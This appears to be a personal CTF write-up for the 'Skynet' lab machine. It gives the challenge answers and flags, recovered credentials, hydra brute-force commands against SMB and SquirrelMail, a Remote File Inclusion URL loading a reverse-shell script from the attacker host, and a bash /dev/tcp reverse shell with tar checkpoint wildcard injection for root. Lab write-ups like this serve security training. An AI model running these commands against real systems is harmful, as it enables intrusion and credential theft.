---
title: "Skynet"

author: Matt Hammond
date: 2022-12-21
url: /skynet/
image: images/2022-thumbs/skynet.jpg
categories:
  - CTF
tags:
  - CTF
draft: false
---

## Questions

1. What is Miles password for his emails? `cyborg007haloterminator`
2. What is the hidden directory? `/45kra24zxs28v3yd`
3. What is the vulnerability called when you can include a remote file for malicious purposes? `Remote File Inclusion`
4. What is the user flag? `7ce5c2109a40f958099283600a9ae807`
5. What is the root flag? `3f0372db24753accc7179a282cd6a949`

---

## Notes

- myIP = 10.18.53.113
- IP = 10.10.242.171

### Exposed Services

```bash
22
80
110
139
445
```

### Users:Passwords

- milesdyson:cyborg007haloterminator (squirrelmail)
- milesdyson:)s{A&2Z=F^n_E.B` (smb)
- serenakogan:

### Vulnerabilities

-

- important.txt $IP/45kra24zxs28v3yd
  - gobuster on this $IP/45kra24zxs28v3yd/administrator

---

## Commands

`ping $IP`

`sudo nmap -sC -sV -oN scans/initial $IP`

smbmap -H 10.10.114.33

gobuster dir -u http://10.10.242.171 -w /usr/local/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee scans/gobuster

hydra -v -l milesdyson -P smb/anonymous/logs/log1.txt smb://10.10.114.33 smb

hydra -v -t 30 -l milesdyson -P smb/anonymous/logs/log1.txt 10.10.242.171 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:Unknown user or password incorrect"

gobuster dir -u http://10.10.242.171/45kra24zxs28v3yd -w /usr/local/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee scans/gobuster2

hydra -v -t 30 -l milesdyson -P smb/anonymous/logs/log1.txt 10.10.242.171 http-post-form "/45kra24zxs28v3yd/administrator:user=^USER^&password=^PASS^:Use a valid username and password to gain access to the administrator"

http://10.10.242.171/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.18.53.113:9999/reverse-shell.php

printf '#!/bin/bash\nbash -i >& /dev/tcp/10.18.53.113/4445 0>&1' > /var/www/html/shell
chmod +x /var/www/html/shell
touch /var/www/html/--checkpoint=1
touch /var/www/html/--checkpoint-action=exec=bash\ shell
